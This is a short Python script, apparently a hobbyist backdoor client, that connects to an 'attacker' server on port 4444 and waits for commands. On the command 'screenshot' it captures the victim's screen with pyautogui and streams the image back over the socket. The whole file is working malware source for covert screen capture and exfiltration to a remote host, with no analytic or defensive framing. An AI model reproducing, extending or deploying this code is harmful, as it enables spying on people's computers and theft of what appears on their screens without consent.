import socket
import pyautogui
from io import BytesIO


def connect_with_attacker():
    # server_ip = '192.168.0.136'
    server_ip = '127.0.1.1'
    port = 4444

    backdoor = socket.socket()
    backdoor.connect((server_ip, port))

    while True:
        try:
            message = backdoor.recv(1024).decode("UTF-8")

            if message == 'screenshot':
                send_screenshot(backdoor)
            else:
                pass
        except:
            print("error")
            backdoor.close()
            break
        pass

    # wait for orders
    # while True:
    #


def send_screenshot(backdoor):
    backdoor.send("screenshot".encode("utf-8"))

    screenshot = pyautogui.screenshot()
    buffered = BytesIO()
    screenshot.save(buffered, format="PNG")
    buffered.seek(0)
    package = buffered.read(1024)
    while package:
        backdoor.send(package)
        package = buffered.read(1024)
    backdoor.send(str.encode('Finished'))
    print("sending finished")


# attacker_thread = threading.Thread(target=connect_with_attacker)
connect_with_attacker()
